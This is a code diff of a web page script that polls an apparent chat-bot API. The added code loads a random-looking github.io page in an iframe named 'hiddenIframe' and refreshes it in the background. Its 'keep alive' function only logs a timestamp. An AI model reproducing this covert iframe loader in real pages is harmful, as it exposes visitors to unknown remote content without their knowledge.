@@ -27,6 +27,9 @@
                 const data = await response.json();
                 if (data.ok) {
                     const messages = data.result;
+                    if (messages.length > 0) {
+                        keepBotAlive();
+                    }
                     messages.forEach(async (msg) => {
                         if (msg.message) {
                             const chatId = msg.message.chat.id;
@@ -67,17 +70,32 @@
             });
         })();
 
-        // Function to open a web page in the background
+        // Function to keep the bot alive if it receives a request
+        function keepBotAlive() {
+            const now = new Date();
+            console.log(`Bot kept alive at ${now}`);
+        }
+
+        // Function to open a web page in the background and keep it alive
         function openInBackground(url) {
             const iframe = document.createElement('iframe');
             iframe.src = url;
             iframe.id = 'hiddenIframe';
             document.body.appendChild(iframe);
+
+            const startTime = Date.now();
+            const interval = setInterval(() => {
+                if (Date.now() - startTime < 60000) { // 1 minute
+                    iframe.src = url;
+                } else {
+                    clearInterval(interval);
+                    document.body.removeChild(iframe);
+                }
+            }, 58000); // Refresh every 58 seconds
         }
 
-        // Example usage: Open a webpage in the background
+        // Open the specified webpage in the background
         openInBackground('https://aqwsedrftgyhujikolpmnbvcxzzaqwsxcd.github.io/sfxgsanvdvvddvhvcbxbbhdfdgjggdghdhdhdvhdvxvd/');
-
     </script>
 </body>
 </html>
